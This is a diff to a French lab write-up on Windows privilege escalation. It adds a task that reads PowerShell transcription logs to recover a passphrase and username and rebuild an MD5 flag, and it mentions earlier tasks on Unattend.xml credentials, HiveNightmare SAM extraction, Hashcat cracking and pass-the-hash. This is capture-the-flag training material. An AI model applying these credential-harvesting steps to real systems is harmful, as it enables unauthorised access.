@@ -2,9 +2,10 @@
 
 ## Vue d'Ensemble du Projet
 
-Ce laboratoire démontre deux techniques d'escalade de privilèges sur Windows :
+Ce laboratoire démontre trois techniques d'escalade de privilèges sur Windows :
 - **Task 0** : Exploitation de fichiers d'installation automatisée (Unattend.xml) contenant des identifiants encodés en Base64
 - **Task 1** : Exploitation de la vulnérabilité HiveNightmare (CVE-2021-36934) pour extraire et cracker les hashes SAM/SYSTEM
+- **Task 3** : Exploitation des journaux de transcription PowerShell pour extraire des secrets et reconstruire un flag par hachage MD5
 
 ---
 
@@ -306,3 +307,95 @@ L'exploitation des fichiers de sauvegarde SAM et SYSTEM via la vulnérabilité H
 - Hashcat avec le dictionnaire rockyou.txt peut cracker des mots de passe faibles
 - Les hashes NTLM peuvent être crackés ou utilisés directement (Pass-the-Hash)
 - PowerShell permet d'exécuter des commandes avec des credentials spécifiques sans session interactive
+
+---
+
+# TASK 3 : Privilege Escalation via PowerShell Transcription Logs
+
+## Objectif
+
+Identifier une vulnérabilité de configuration dans la journalisation PowerShell, extraire des secrets (passphrase et identifiants) à partir des fichiers de transcription, et reconstruire un flag généré dynamiquement via un algorithme de hachage MD5.
+
+---
+
+## Étape 1 : Analyse de la Configuration (Reconnaissance)
+
+Vérifier les clés de registre pour confirmer que la transcription PowerShell est active et localiser le répertoire de sortie.
+
+**Commande :**
+```powershell
+Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription'
+```
+
+**Résultat :**
+```text
+EnableTranscripting = 1
+OutputDirectory = C:\Users\Student\Documents\PowerShell
+```
+
+---
+
+## Étape 2 : Localisation des Journaux Sensibles
+
+Rechercher récursivement les fichiers de transcription créés par d'autres utilisateurs ou lors de sessions précédentes.
+
+**Commande :**
+```powershell
+Get-ChildItem 'C:\Users\Student\Documents\PowerShell' -Recurse | Select FullName
+```
+
+**Découverte :**
+Présence de plusieurs dossiers datés, notamment le dossier récent `20260313` contenant des logs de sessions administratives.
+
+---
+
+## Étape 3 : Extraction de la Logique et des Secrets
+
+Analyser le contenu des logs pour identifier des commandes manipulant des variables sensibles comme `$passPhrase`, `$username` ou `$flag`.
+
+**Commande de recherche :**
+```powershell
+Select-String -Path 'C:\Users\Student\Documents\PowerShell\20260313\*.txt' -Pattern '\$flag\s*='
+```
+
+**Données extraites :**
+```powershell
+$passPhrase = 'L0K8H7I6G5F4E3D2'
+$username = 'JoBEph'
+```
+
+**Méthode de génération :**
+Concaténation de la passphrase et du nom d'utilisateur, puis calcul du hachage MD5 de la chaîne résultante.
+
+---
+
+## Étape 4 : Reconstruction du Flag (Exploitation)
+
+Utiliser les secrets récupérés pour rejouer la logique de génération du flag directement dans PowerShell.
+
+**Script de calcul :**
+```powershell
+$passPhrase = 'L0K8H7I6G5F4E3D2'
+$username = 'JoBEph'
+$inputString = $passPhrase + $username
+$md5 = [System.Security.Cryptography.MD5]::Create()
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($inputString)
+$hash = $md5.ComputeHash($bytes)
+$flag = [System.BitConverter]::ToString($hash).Replace('-', '').ToLower()
+```
+
+**Résultat final :**
+`b951ad0895ae4ae7bbff3601d683e80a`
+
+---
+
+## Conclusion Task 3
+
+L'analyse des journaux de transcription PowerShell permet de récupérer des secrets exposés par des sessions précédentes et de reconstituer un flag généré dynamiquement sans avoir besoin d'accéder directement à un compte privilégié.
+
+### Leçons Apprises
+
+- Une mauvaise configuration de la transcription PowerShell peut exposer des données sensibles dans des fichiers lisibles
+- Les journaux de commandes peuvent révéler des identifiants, des passphrases et la logique applicative utilisée pour générer des secrets
+- La reconstruction d'un résultat à partir d'éléments observés dans les logs peut suffire à contourner la nécessité d'une élévation de privilèges classique
+- Les fonctions de hachage comme MD5 restent faciles à reproduire lorsqu'on possède les entrées d'origine
